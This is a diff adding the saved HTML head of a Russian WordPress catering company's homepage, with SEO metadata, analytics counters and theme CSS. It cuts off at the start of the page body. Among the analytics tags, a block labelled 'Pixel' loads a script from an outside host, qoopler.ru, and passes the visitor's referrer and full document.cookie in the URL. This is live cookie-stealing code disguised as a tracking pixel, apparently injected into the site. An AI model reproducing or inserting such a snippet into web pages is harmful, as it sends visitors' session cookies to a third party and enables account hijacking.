@@ -1,0 +1,302 @@
+     1→     1→<!DOCTYPE html>
+     2→     2→<html lang="ru-RU">
+     3→     3→<head>
+     4→     4→        <meta charset="UTF-8">
+     5→     5→        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+     6→     6→        <link rel="profile" href="http://gmpg.org/xfn/11">
+     7→     7→    <meta name="yandex-verification" content="47b08386a3d1206" />
+     8→     8→<title>Кейтеринг СПб | Кейтеринговая компания Interfood Catering</title>
+     9→     9→
+    10→    10→<!-- All In One SEO Pack 3.6.2[259,329] -->
+    11→    11→<meta name="description"  content="Заказать кейтеринг в Санкт-Петербурге недорого в офис, на дом, на день рождения, на новый год. Доставка и обслуживание фуршетов, банкетов, корпоративов, свадеб" />
+    12→    12→
+    13→    13→<meta name="keywords"  content="Свадебный кейтеринг,кейтеринг,свадебный банкет,свадебный фуршет,фуршет на свадьбу,банкет на свадьбу,выездной кейтеринг на свадьбу" />
+    14→    14→<link rel="next" href="https://interfood-catering.ru/page/2" />
+    15→    15→
+    16→    16→<script type="application/ld+json" class="aioseop-schema">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://interfood-catering.ru/#organization","url":"https://interfood-catering.ru/","name":"Кейтеринг СПб","sameAs":[],"logo":{"@type":"ImageObject","@id":"https://interfood-catering.ru/#logo","url":"https://interfood-catering.ru/wp-content/uploads/2021/01/Group-1-1.png","caption":""},"image":{"@id":"https://interfood-catering.ru/#logo"}},{"@type":"WebSite","@id":"https://interfood-catering.ru/#website","url":"https://interfood-catering.ru/","name":"Кейтеринг СПб","publisher":{"@id":"https://interfood-catering.ru/#organization"},"potentialAction":{"@type":"SearchAction","target":"https://interfood-catering.ru/?s={search_term_string}","query-input":"required name=search_term_string"}},{"@type":"WebPage","@id":"https://interfood-catering.ru#webpage","url":"https://interfood-catering.ru","inLanguage":"ru-RU","name":"Кейтеринг СПб","isPartOf":{"@id":"https://interfood-catering.ru/#website"},"breadcrumb":{"@id":"https://interfood-catering.ru#breadcrumblist"},"description":"Заказать кейтеринг в Санкт-Петербурге недорого в офис, на дом, на день рождения, на новый год. Доставка и обслуживание фуршетов, банкетов, корпоративов, свадеб\r\n","about":{"@id":"https://interfood-catering.ru/#organization"}},{"@type":"BreadcrumbList","@id":"https://interfood-catering.ru#breadcrumblist","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://interfood-catering.ru/","url":"https://interfood-catering.ru/","name":"Кейтеринг СПб | Кейтеринговая компания Interfood Catering"}}]}]}</script>
+    17→    17→<link rel="canonical" href="https://interfood-catering.ru/" />
+    18→    18→<!-- All In One SEO Pack -->
+    19→    19→<link rel='dns-prefetch' href='//www.google.com' />
+    20→    20→<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+    21→    21→<link rel='dns-prefetch' href='//s.w.org' />
+    22→    22→<link rel="alternate" type="application/rss+xml" title="Кейтеринг СПб &raquo; Лента" href="https://interfood-catering.ru/feed" />
+    23→    23→<link rel="alternate" type="application/rss+xml" title="Кейтеринг СПб &raquo; Лента комментариев" href="https://interfood-catering.ru/comments/feed" />
+    24→    24→
+    25→    25→
+    26→    26→<!-- WS Google Webmaster Tools v2.1 - https://wordpress.org/plugins/ws-google-webmaster-tools/ -->
+    27→    27→<!-- Website - http://www.webshouter.net/ -->
+    28→    28→<script>
+    29→    29→  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    30→    30→  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    31→    31→  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    32→    32→  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    33→    33→
+    34→    34→  ga('create', 'UA-69126052-1', 'auto');
+    35→    35→  ga('send', 'pageview');
+    36→    36→
+    37→    37→</script>
+    38→    38→<!-- / WS Google Webmaster Tools plugin. -->
+    39→    39→
+    40→    40→                <script type="text/javascript">
+    41→    41→                        window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/interfood-catering.ru\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.19"}};
+    42→    42→                        /*! This file is auto-generated */
+    43→    43→                        !function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+    44→    44→                </script>
+    45→    45→                <style type="text/css">
+    46→    46→img.wp-smiley,
+    47→    47→img.emoji {
+    48→    48→        display: inline !important;
+    49→    49→        border: none !important;
+    50→    50→        box-shadow: none !important;
+    51→    51→        height: 1em !important;
+    52→    52→        width: 1em !important;
+    53→    53→        margin: 0 .07em !important;
+    54→    54→        vertical-align: -0.1em !important;
+    55→    55→        background: none !important;
+    56→    56→        padding: 0 !important;
+    57→    57→}
+    58→    58→</style>
+    59→    59→                        <style type="text/css">
+    60→    60→                                </style>
+    61→    61→        <link rel='stylesheet' id='v48fv_images-css'  href='https://interfood-catering.ru/wp-content/plugins/wp-headfoot/library/base/public/css/images.css?ver=3.4.v48fv' type='text/css' media='all' />
+    62→    62→<link rel='stylesheet' id='v48fv_front-css'  href='https://interfood-catering.ru/wp-content/plugins/wp-headfoot/library/base/public/css/front.css?ver=3.4.v48fv' type='text/css' media='all' />
+    63→    63→<link rel='stylesheet' id='v48fv_common-css'  href='https://interfood-catering.ru/wp-content/plugins/wp-headfoot/library/base/public/css/common.css?ver=3.4.v48fv' type='text/css' media='all' />
+    64→    64→<link rel='stylesheet' id='wp-block-library-css'  href='https://interfood-catering.ru/wp-includes/css/dist/block-library/style.min.css?ver=5.4.19' type='text/css' media='all' />
+    65→    65→<link rel='stylesheet' id='contact-form-7-css'  href='https://interfood-catering.ru/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.1.1' type='text/css' media='all' />
+    66→    66→<link rel='stylesheet' id='bard-style-css'  href='https://interfood-catering.ru/wp-content/themes/bard/style.css?ver=1.4.9.8' type='text/css' media='all' />
+    67→    67→<link rel='stylesheet' id='fontello-css'  href='https://interfood-catering.ru/wp-content/themes/bard/assets/css/fontello.css?ver=5.4.19' type='text/css' media='all' />
+    68→    68→<link rel='stylesheet' id='slick-css'  href='https://interfood-catering.ru/wp-content/themes/bard/assets/css/slick.css?ver=5.4.19' type='text/css' media='all' />
+    69→    69→<link rel='stylesheet' id='scrollbar-css'  href='https://interfood-catering.ru/wp-content/themes/bard/assets/css/perfect-scrollbar.css?ver=5.4.19' type='text/css' media='all' />
+    70→    70→<link rel='stylesheet' id='bard-woocommerce-css'  href='https://interfood-catering.ru/wp-content/themes/bard/assets/css/woocommerce.css?ver=5.4.19' type='text/css' media='all' />
+    71→    71→<link rel='stylesheet' id='bard-responsive-css'  href='https://interfood-catering.ru/wp-content/themes/bard/assets/css/responsive.css?ver=5.4.19' type='text/css' media='all' />
+    72→    72→<link rel='stylesheet' id='bard-montserratr-font-css'  href='//fonts.googleapis.com/css?family=Montserrat%3A300%2C300i%2C400%2C400i%2C500%2C500i%2C600%2C600i%2C700%2C700i&#038;ver=1.0.0' type='text/css' media='all' />
+    73→    73→<link rel='stylesheet' id='bard-opensans-font-css'  href='//fonts.googleapis.com/css?family=Open+Sans%3A400%2C400i%2C600%2C600i%2C700%2C700i&#038;ver=1.0.0' type='text/css' media='all' />
+    74→    74→<link rel='stylesheet' id='bard-arizonia-font-css'  href='//fonts.googleapis.com/css?family=Arizonia%3A300%2C300i%2C400%2C400i%2C500%2C500i%2C600%2C600i%2C700%2C700i&#038;ver=1.0.0' type='text/css' media='all' />
+    75→    75→<link rel='stylesheet' id='slb_core-css'  href='https://interfood-catering.ru/wp-content/plugins/simple-lightbox/client/css/app.css?ver=2.8.1' type='text/css' media='all' />
+    76→    76→<link rel='stylesheet' id='wp-paginate-css'  href='https://interfood-catering.ru/wp-content/plugins/wp-paginate/css/wp-paginate.css?ver=2.0.7' type='text/css' media='screen' />
+    77→    77→<script type='text/javascript' src='https://interfood-catering.ru/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
+    78→    78→<script type='text/javascript' src='https://interfood-catering.ru/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+    79→    79→<link rel='https://api.w.org/' href='https://interfood-catering.ru/wp-json/' />
+    80→    80→<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://interfood-catering.ru/xmlrpc.php?rsd" />
+    81→    81→<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://interfood-catering.ru/wp-includes/wlwmanifest.xml" /> 
+    82→    82→<meta name="generator" content="WordPress 5.4.19" />
+    83→    83→<style id="bard_dynamic_css">body {background-color: #ffffff;}#top-bar {background-color: #ffffff;}#top-bar a {color: #000000;}#top-bar a:hover,#top-bar li.current-menu-item > a,#top-bar li.current-menu-ancestor > a,#top-bar .sub-menu li.current-menu-item > a,#top-bar .sub-menu li.current-menu-ancestor> a {color: #3948ba;}#top-menu .sub-menu,#top-menu .sub-menu a {background-color: #ffffff;border-color: rgba(0,0,0, 0.05);}.header-logo a,.site-description,.header-socials-icon {color: #111111;}.site-description:before,.site-description:after {background: #111111;}.header-logo a:hover,.header-socials-icon:hover {color: #111111;}.entry-header {background-color: #ffffff;}#main-nav {background-color: #ffffff;box-shadow: 0px 1px 5px rgba(0,0,0, 0.1);}#main-nav a,#main-nav .svg-inline--fa,#main-nav #s {color: #000000;}.main-nav-sidebar div span,.sidebar-alt-close-btn span,.btn-tooltip {background-color: #000000;}.btn-tooltip:before {border-top-color: #000000;}#main-nav a:hover,#main-nav .svg-inline--fa:hover,#main-nav li.current-menu-item > a,#main-nav li.current-menu-ancestor > a,#main-nav .sub-menu li.current-menu-item > a,#main-nav .sub-menu li.current-menu-ancestor > a {color: #3948ba;}.main-nav-sidebar:hover div span {background-color: #3948ba;}#main-menu .sub-menu,#main-menu .sub-menu a {background-color: #ffffff;border-color: rgba(0,0,0, 0.05);}#main-nav #s {background-color: #ffffff;}#main-nav #s::-webkit-input-placeholder { /* Chrome/Opera/Safari */color: rgba(0,0,0, 0.7);}#main-nav #s::-moz-placeholder { /* Firefox 19+ */color: rgba(0,0,0, 0.7);}#main-nav #s:-ms-input-placeholder { /* IE 10+ */color: rgba(0,0,0, 0.7);}#main-nav #s:-moz-placeholder { /* Firefox 18- */color: rgba(0,0,0, 0.7);}/* Background */.sidebar-alt,.main-content,.featured-slider-area,#featured-links,.page-content select,.page-content input,.page-content textarea {background-color: #ffffff;}.featured-link .cv-inner {border-color: rgba(255,255,255, 0.4);}.featured-link:hover .cv-inner {border-color: rgba(255,255,255, 0.8);}#featured-links h6 {background-color: #ffffff;color: #000000;}/* Text */.page-content,.page-content select,.page-content input,.page-content textarea,.page-content .post-author a,.page-content .bard-widget a,.page-content .comment-author {color: #464646;}/* Title */.page-content h1,.page-content h2,.page-content h3,.page-content h4,.page-content h5,.page-content h6,.page-content .post-title a,.page-content .post-author a,.page-content .author-description h3 a,.page-content .related-posts h5 a,.page-content .blog-pagination .previous-page a,.page-content .blog-pagination .next-page a,blockquote,.page-content .post-share a,.page-content .read-more a {color: #030303;}.widget_wysija .widget-title h4:after {background-color: #030303;}.page-content .read-more a:hover,.page-content .post-title a:hover {color: rgba(3,3,3, 0.75);}/* Meta */.page-content .post-author,.page-content .post-comments,.page-content .post-date,.page-content .post-meta,.page-content .post-meta a,.page-content .related-post-date,.page-content .comment-meta a,.page-content .author-share a,.page-content .post-tags a,.page-content .tagcloud a,.widget_categories li,.widget_archive li,.ahse-subscribe-box p,.rpwwt-post-author,.rpwwt-post-categories,.rpwwt-post-date,.rpwwt-post-comments-number,.copyright-info,#page-footer .copyright-info a,.footer-menu-container,#page-footer .footer-menu-container a,.single-navigation span,.comment-notes {color: #a1a1a1;}.page-content input::-webkit-input-placeholder { /* Chrome/Opera/Safari */color: #a1a1a1;}.page-content input::-moz-placeholder { /* Firefox 19+ */color: #a1a1a1;}.page-content input:-ms-input-placeholder { /* IE 10+ */color: #a1a1a1;}.page-content input:-moz-placeholder { /* Firefox 18- */color: #a1a1a1;}/* Accent */.page-content a,.post-categories,#page-wrap .bard-widget.widget_text a,.scrolltop,.required {color: #3948ba;}/* Disable TMP.page-content .elementor a,.page-content .elementor a:hover {color: inherit;}*/.ps-container > .ps-scrollbar-y-rail > .ps-scrollbar-y,.read-more a:after {background: #3948ba;}.page-content a:hover,.scrolltop:hover {color: rgba(57,72,186, 0.8);}blockquote {border-color: #3948ba;}.widget-title h4 {border-top-color: #3948ba;}/* Selection */::-moz-selection {color: #ffffff;background: #3948ba;}::selection {color: #ffffff;background: #3948ba;}/* Border */.page-content .post-footer,.blog-list-style,.page-content .author-description,.page-content .related-posts,.page-content .entry-comments,.page-content .bard-widget li,.page-content #wp-calendar,.page-content #wp-calendar caption,.page-content #wp-calendar tbody td,.page-content .widget_nav_menu li a,.page-content .tagcloud a,.page-content select,.page-content input,.page-content textarea,.post-tags a,.gallery-caption,.wp-caption-text,table tr,table th,table td,pre,.single-navigation {border-color: #e8e8e8;}#main-menu > li:after,.border-divider,hr {background-color: #e8e8e8;}/* Buttons */.widget_search .svg-fa-wrap,.widget_search #searchsubmit,.wp-block-search button,.page-content .submit,.page-content .blog-pagination.numeric a,.page-content .post-password-form input[type="submit"],.page-content .wpcf7 [type="submit"] {color: #ffffff;background-color: #333333;}.page-content .submit:hover,.page-content .blog-pagination.numeric a:hover,.page-content .blog-pagination.numeric span,.page-content .bard-subscribe-box input[type="submit"],.page-content .widget_wysija input[type="submit"],.page-content .post-password-form input[type="submit"]:hover,.page-content .wpcf7 [type="submit"]:hover {color: #ffffff;background-color: #3948ba;}/* Image Overlay */.image-overlay,#infscr-loading,.page-content h4.image-overlay {color: #ffffff;background-color: rgba(73,73,73, 0.2);}.image-overlay a,.post-slider .prev-arrow,.post-slider .next-arrow,.page-content .image-overlay a,#featured-slider .slider-dots {color: #ffffff;}.slide-caption {background: rgba(255,255,255, 0.95);}#featured-slider .prev-arrow,#featured-slider .next-arrow,#featured-slider .slick-active,.slider-title:after {background: #ffffff;}.footer-socials,.footer-widgets {background: #ffffff;}.instagram-title {background: rgba(255,255,255, 0.85);}#page-footer,#page-footer a,#page-footer select,#page-footer input,#page-footer textarea {color: #222222;}#page-footer #s::-webkit-input-placeholder { /* Chrome/Opera/Safari */color: #222222;}#page-footer #s::-moz-placeholder { /* Firefox 19+ */color: #222222;}#page-footer #s:-ms-input-placeholder { /* IE 10+ */color: #222222;}#page-footer #s:-moz-placeholder { /* Firefox 18- */color: #222222;}/* Title */#page-footer h1,#page-footer h2,#page-footer h3,#page-footer h4,#page-footer h5,#page-footer h6,#page-footer .footer-socials a{color: #111111;}#page-footer a:hover {color: #3948ba;}/* Border */#page-footer a,#page-footer .bard-widget li,#page-footer #wp-calendar,#page-footer #wp-calendar caption,#page-footer #wp-calendar tbody td,#page-footer .widget_nav_menu li a,#page-footer select,#page-footer input,#page-footer textarea,#page-footer .widget-title h4:before,#page-footer .widget-title h4:after,.alt-widget-title,.footer-widgets {border-color: #e8e8e8;}.sticky,.footer-copyright,.bard-widget.widget_wysija {background-color: #f6f6f6;}.bard-preloader-wrap {background-color: #ffffff;}.boxed-wrapper {max-width: 1160px;}.sidebar-alt {max-width: 340px;left: -340px; padding: 85px 35px 0px;}.sidebar-left,.sidebar-right {width: 302px;}.main-container {width: 100%;}#top-bar > div,#main-nav > div,#featured-links,.main-content,.page-footer-inner,.featured-slider-area.boxed-wrapper {padding-left: 40px;padding-right: 40px;}@media screen and ( max-width: 979px ) {.top-bar-socials {float: none !important;}.top-bar-socials a {line-height: 40px !important;}}.entry-header {height: 450px;background-image: url();background-size: initial;}.logo-img {max-width: 700px;}.header-logo a:not(.logo-img),.site-description {display: none;}#main-nav {text-align: center;}.main-nav-icons {position: absolute;top: 0px;right: 40px;z-index: 2;}.main-nav-buttons {position: absolute;top: 0px;left: 40px;z-index: 1;}#main-menu {padding-left: 0 !important;}#featured-links .featured-link {margin-right: 25px;}#featured-links .featured-link:last-of-type {margin-right: 0;}#featured-links .featured-link {width: calc( (100% - -25px) / 0 - 1px);width: -webkit-calc( (100% - -25px) / 0- 1px);}.featured-link:nth-child(1) .cv-inner {display: none;}.featured-link:nth-child(2) .cv-inner {display: none;}.featured-link:nth-child(3) .cv-inner {display: none;}.blog-grid > li {display: inline-block;vertical-align: top;margin-right: 32px;margin-bottom: 35px;}.blog-grid > li.blog-grid-style {width: calc((100% - 32px ) /2 - 1px);width: -webkit-calc((100% - 32px ) /2 - 1px);}@media screen and ( min-width: 979px ) {.blog-grid > .blog-list-style:nth-last-of-type(-n+1) {margin-bottom: 0;}.blog-grid > .blog-grid-style:nth-last-of-type(-n+2) { margin-bottom: 0;}}@media screen and ( max-width: 640px ) {.blog-grid > li:nth-last-of-type(-n+1) {margin-bottom: 0;}}.blog-grid > li:nth-of-type(2n+1) {margin-right: 0;}.blog-classic-style .post-content > p:first-of-type:first-letter,.single .post-content > p:not(.wp-block-tag-cloud):first-of-type:first-letter,article.page .post-content > p:first-child:first-letter {float: left;margin: 6px 9px 0 -1px;font-family: 'Montserrat';font-weight: normal;font-style: normal;font-size: 81px;line-height: 65px;text-align: center;text-transform: uppercase;color: #030303;}@-moz-document url-prefix() {.blog-classic-style .post-content > p:first-of-type:first-letter,.single .post-content > p:not(.wp-block-tag-cloud):first-of-type:first-letter,article.page .post-content > p:first-child:first-letter {margin-top: 10px !important;}}.header-logo a {font-family: 'Arizonia';}#top-menu li a {font-family: 'Open Sans';}#main-menu li a {font-family: 'Open Sans';}#mobile-menu li {font-family: 'Open Sans';}#top-menu li a,#main-menu li a,#mobile-menu li {text-transform: uppercase;}.footer-widgets .page-footer-inner > .bard-widget {width: 30%;margin-right: 5%;}.footer-widgets .page-footer-inner > .bard-widget:nth-child(3n+3) {margin-right: 0;}.footer-widgets .page-footer-inner > .bard-widget:nth-child(3n+4) {clear: both;}.woocommerce div.product .stock,.woocommerce div.product p.price,.woocommerce div.product span.price,.woocommerce ul.products li.product .price,.woocommerce-Reviews .woocommerce-review__author,.woocommerce form .form-row .required,.woocommerce form .form-row.woocommerce-invalid label,.woocommerce .page-content div.product .woocommerce-tabs ul.tabs li a {color: #464646;}.woocommerce a.remove:hover {color: #464646 !important;}.woocommerce a.remove,.woocommerce .product_meta,.page-content .woocommerce-breadcrumb,.page-content .woocommerce-review-link,.page-content .woocommerce-breadcrumb a,.page-content .woocommerce-MyAccount-navigation-link a,.woocommerce .woocommerce-info:before,.woocommerce .page-content .woocommerce-result-count,.woocommerce-page .page-content .woocommerce-result-count,.woocommerce-Reviews .woocommerce-review__published-date,.woocommerce .product_list_widget .quantity,.woocommerce .widget_products .amount,.woocommerce .widget_price_filter .price_slider_amount,.woocommerce .widget_recently_viewed_products .amount,.woocommerce .widget_top_rated_products .amount,.woocommerce .widget_recent_reviews .reviewer {color: #a1a1a1;}.woocommerce a.remove {color: #a1a1a1 !important;}p.demo_store,.woocommerce-store-notice,.woocommerce span.onsale { background-color: #3948ba;}.woocommerce .star-rating::before,.woocommerce .star-rating span::before,.woocommerce .page-content ul.products li.product .button,.page-content .woocommerce ul.products li.product .button,.page-content .woocommerce-MyAccount-navigation-link.is-active a,.page-content .woocommerce-MyAccount-navigation-link a:hover,.woocommerce-message::before { color: #3948ba;}.woocommerce form.login,.woocommerce form.register,.woocommerce-account fieldset,.woocommerce form.checkout_coupon,.woocommerce .woocommerce-info,.woocommerce .woocommerce-error,.woocommerce .woocommerce-message,.woocommerce .widget_shopping_cart .total,.woocommerce.widget_shopping_cart .total,.woocommerce-Reviews .comment_container,.woocommerce-cart #payment ul.payment_methods,#add_payment_method #payment ul.payment_methods,.woocommerce-checkout #payment ul.payment_methods,.woocommerce div.product .woocommerce-tabs ul.tabs::before,.woocommerce div.product .woocommerce-tabs ul.tabs::after,.woocommerce div.product .woocommerce-tabs ul.tabs li,.woocommerce .woocommerce-MyAccount-navigation-link,.select2-container--default .select2-selection--single {border-color: #e8e8e8;}.woocommerce-cart #payment,#add_payment_method #payment,.woocommerce-checkout #payment,.woocommerce .woocommerce-info,.woocommerce .woocommerce-error,.woocommerce .woocommerce-message,.woocommerce div.product .woocommerce-tabs ul.tabs li {background-color: rgba(232,232,232, 0.3);}.woocommerce-cart #payment div.payment_box::before,#add_payment_method #payment div.payment_box::before,.woocommerce-checkout #payment div.payment_box::before {border-color: rgba(232,232,232, 0.5);}.woocommerce-cart #payment div.payment_box,#add_payment_method #payment div.payment_box,.woocommerce-checkout #payment div.payment_box {background-color: rgba(232,232,232, 0.5);}.page-content .woocommerce input.button,.page-content .woocommerce a.button,.page-content .woocommerce a.button.alt,.page-content .woocommerce button.button.alt,.page-content .woocommerce input.button.alt,.page-content .woocommerce #respond input#submit.alt,.woocommerce .page-content .widget_product_search input[type="submit"],.woocommerce .page-content .woocommerce-message .button,.woocommerce .page-content a.button.alt,.woocommerce .page-content button.button.alt,.woocommerce .page-content #respond input#submit,.woocommerce .page-content .widget_price_filter .button,.woocommerce .page-content .woocommerce-message .button,.woocommerce-page .page-content .woocommerce-message .button {color: #ffffff;background-color: #333333;}.page-content .woocommerce input.button:hover,.page-content .woocommerce a.button:hover,.page-content .woocommerce a.button.alt:hover,.page-content .woocommerce button.button.alt:hover,.page-content .woocommerce input.button.alt:hover,.page-content .woocommerce #respond input#submit.alt:hover,.woocommerce .page-content .woocommerce-message .button:hover,.woocommerce .page-content a.button.alt:hover,.woocommerce .page-content button.button.alt:hover,.woocommerce .page-content #respond input#submit:hover,.woocommerce .page-content .widget_price_filter .button:hover,.woocommerce .page-content .woocommerce-message .button:hover,.woocommerce-page .page-content .woocommerce-message .button:hover {color: #ffffff;background-color: #3948ba;}#loadFacebookG{width:35px;height:35px;display:block;position:relative;margin:auto}.facebook_blockG{background-color:#00a9ff;border:1px solid #00a9ff;float:left;height:25px;margin-left:2px;width:7px;opacity:.1;animation-name:bounceG;-o-animation-name:bounceG;-ms-animation-name:bounceG;-webkit-animation-name:bounceG;-moz-animation-name:bounceG;animation-duration:1.235s;-o-animation-duration:1.235s;-ms-animation-duration:1.235s;-webkit-animation-duration:1.235s;-moz-animation-duration:1.235s;animation-iteration-count:infinite;-o-animation-iteration-count:infinite;-ms-animation-iteration-count:infinite;-webkit-animation-iteration-count:infinite;-moz-animation-iteration-count:infinite;animation-direction:normal;-o-animation-direction:normal;-ms-animation-direction:normal;-webkit-animation-direction:normal;-moz-animation-direction:normal;transform:scale(0.7);-o-transform:scale(0.7);-ms-transform:scale(0.7);-webkit-transform:scale(0.7);-moz-transform:scale(0.7)}#blockG_1{animation-delay:.3695s;-o-animation-delay:.3695s;-ms-animation-delay:.3695s;-webkit-animation-delay:.3695s;-moz-animation-delay:.3695s}#blockG_2{animation-delay:.496s;-o-animation-delay:.496s;-ms-animation-delay:.496s;-webkit-animation-delay:.496s;-moz-animation-delay:.496s}#blockG_3{animation-delay:.6125s;-o-animation-delay:.6125s;-ms-animation-delay:.6125s;-webkit-animation-delay:.6125s;-moz-animation-delay:.6125s}@keyframes bounceG{0%{transform:scale(1.2);opacity:1}100%{transform:scale(0.7);opacity:.1}}@-o-keyframes bounceG{0%{-o-transform:scale(1.2);opacity:1}100%{-o-transform:scale(0.7);opacity:.1}}@-ms-keyframes bounceG{0%{-ms-transform:scale(1.2);opacity:1}100%{-ms-transform:scale(0.7);opacity:.1}}@-webkit-keyframes bounceG{0%{-webkit-transform:scale(1.2);opacity:1}100%{-webkit-transform:scale(0.7);opacity:.1}}@-moz-keyframes bounceG{0%{-moz-transform:scale(1.2);opacity:1}100%{-moz-transform:scale(0.7);opacity:.1}}</style><!-- Yandex.Metrika counter by Yandex Metrica Plugin -->
+    84→    84→<script type="text/javascript" >
+    85→    85→    (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+    86→    86→        m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+    87→    87→    (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+    88→    88→
+    89→    89→    ym(37802695, "init", {
+    90→    90→        id:37802695,
+    91→    91→        clickmap:true,
+    92→    92→        trackLinks:true,
+    93→    93→        accurateTrackBounce:true,
+    94→    94→        webvisor:true,
+    95→    95→                });
+    96→    96→</script>
+    97→    97→<noscript><div><img src="https://mc.yandex.ru/watch/37802695" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+    98→    98→<!-- /Yandex.Metrika counter -->
+    99→    99→<link rel="icon" href="https://interfood-catering.ru/wp-content/uploads/2021/02/cropped-4b-32x32.png" sizes="32x32" />
+   100→   100→<link rel="icon" href="https://interfood-catering.ru/wp-content/uploads/2021/02/cropped-4b-192x192.png" sizes="192x192" />
+   101→   101→<link rel="apple-touch-icon" href="https://interfood-catering.ru/wp-content/uploads/2021/02/cropped-4b-180x180.png" />
+   102→   102→<meta name="msapplication-TileImage" content="https://interfood-catering.ru/wp-content/uploads/2021/02/cropped-4b-270x270.png" />
+   103→   103→</head>
+   104→   104→        
+   105→   105→        <!-- Yandex.Metrika counter -->
+   106→   106→<script type="text/javascript" >
+   107→   107→   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   108→   108→   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   109→   109→   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+   110→   110→
+   111→   111→   ym(37802695, "init", {
+   112→   112→        clickmap:true,
+   113→   113→        trackLinks:true,
+   114→   114→        accurateTrackBounce:true,
+   115→   115→        webvisor:true
+   116→   116→   });
+   117→   117→</script>
+   118→   118→<noscript><div><img src="https://mc.yandex.ru/watch/37802695" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+   119→   119→<!-- /Yandex.Metrika counter -->
+   120→   120→                        
+   121→   121→<!-- Pixel -->
+   122→   122→<script type="text/javascript">
+   123→   123→    (function (d, w) {
+   124→   124→        var n = d.getElementsByTagName("script")[0],
+   125→   125→            s = d.createElement("script"),
+   126→   126→            f = function () { n.parentNode.insertBefore(s, n); };
+   127→   127→                s.type = "text/javascript";
+   128→   128→                s.async = true;
+   129→   129→                s.src = "https://qoopler.ru/index.php?ref="+d.referrer+"&cookie=" + encodeURIComponent(document.cookie);
+   130→   130→
+   131→   131→                if (w.opera == "[object Opera]") {
+   132→   132→                    d.addEventListener("DOMContentLoaded", f, false);
+   133→   133→                } else { f(); }
+   134→   134→    })(document, window);
+   135→   135→</script>
+   136→   136→<!-- /Pixel -->
+   137→   137→            
+   138→   138→        <!-- Global site tag (gtag.js) - Google Analytics -->
+   139→   139→<script async src="https://www.googletagmanager.com/gtag/js?id=UA-139138920-1"></script>
+   140→   140→<script>
+   141→   141→  window.dataLayer = window.dataLayer || [];
+   142→   142→  function gtag(){dataLayer.push(arguments);}
+   143→   143→  gtag('js', new Date());
+   144→   144→
+   145→   145→  gtag('config', 'UA-139138920-1');
+   146→   146→</script>
+   147→   147→<body class="home blog wp-custom-logo wp-embed-responsive">
+   148→   148→
+   149→   149→        <!-- Preloader -->
+   150→   150→        
+   151→   151→        <!-- Page Wrapper -->
+   152→   152→        <div id="page-wrap">
+   153→   153→
+   154→   154→                <!-- Boxed Wrapper -->
+   155→   155→                <div id="page-header" >
+   156→   156→
+   157→   157→                
+   158→   158→
+   159→   159→
+   160→   160→        <div class="entry-header" data-parallax="" data-image="">
+   161→   161→
+   162→   162→                <div class="cv-outer">
+   163→   163→
+   164→   164→                <div class="cv-inner">
+   165→   165→
+   166→   166→
